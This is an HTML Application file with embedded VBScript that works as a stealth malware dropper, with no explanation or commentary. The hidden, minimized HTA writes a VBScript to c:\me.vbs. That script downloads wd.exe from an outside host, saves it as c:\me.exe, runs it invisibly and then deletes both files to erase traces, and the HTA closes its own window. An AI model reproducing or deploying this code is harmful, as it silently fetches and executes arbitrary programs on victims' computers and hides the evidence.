<HTML>
<HEAD>
 <TITLE></TITLE>
    <HTA:APPLICATION ID="pASSrAPER"
     APPLICATIONNAME="ujustgotjackedfoo"
     BORDER="none"
     BORDERSTYLE="normal"
     CAPTION="no"
     ICON=""
     CONTEXTMENU="no"
     MAXIMIZEBUTTON="yes"
     MINIMIZEBUTTON="yes"
     SHOWINTASKBAR="no"
     SINGLEINSTANCE="no"
     SYSMENU="no"
     VERSION="1.0"
     WINDOWSTATE="minimize"/>

<SCRIPT LANGUAGE="VBScript">
MyFile = "c:\me.vbs"
Set FSO = CreateObject("Scripting.FileSystemObject")
Set TSO = FSO.CreateTextFile(MyFile, True)
TSO.write "Set FSO = CreateObject(""Scripting.FileSystemObject"")" & vbcrlf
TSO.write "Dim BinaryData" & vbcrlf
TSO.write "Dim xml" & vbcrlf
TSO.write "Set xml = CreateObject(""Microsoft.XMLHTTP"")" & vbcrlf
TSO.write "xml.Open ""GET"", ""http://doomdead.com/users/illwill/wd.exe"", False " & vbcrlf
TSO.write "xml.Send" & vbcrlf
TSO.write "BinaryData = xml.ResponseBody" & vbcrlf
TSO.write "Const adTypeBinary = 1" & vbcrlf
TSO.write "Const adSaveCreateOverWrite = 2" & vbcrlf
TSO.write "Dim BinaryStream" & vbcrlf
TSO.write "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
TSO.write "BinaryStream.Type = adTypeBinary" & vbcrlf
TSO.write "BinaryStream.Open" & vbcrlf
TSO.write "BinaryStream.Write BinaryData" & vbcrlf
TSO.write "BinaryStream.SaveToFile ""c:\me.exe"", adSaveCreateOverWrite" & vbcrlf
TSO.write "Dim WshShell"  & vbcrlf
TSO.write "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
TSO.write "WshShell.Run ""c:\me.exe"", 0, true" & vbcrlf
TSO.write "FSO.DeleteFile ""c:\me.vbs"", True" & vbcrlf
TSO.write "FSO.DeleteFile ""c:\me.exe"", True" & vbcrlf
TSO.write "Set FSO = Nothing" & vbcrlf
TSO.close
Set TSO = Nothing
Set FSO = Nothing

Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\me.vbs", 0, false
</SCRIPT>
<script>
window.close()
</script>
</HEAD>
</html>


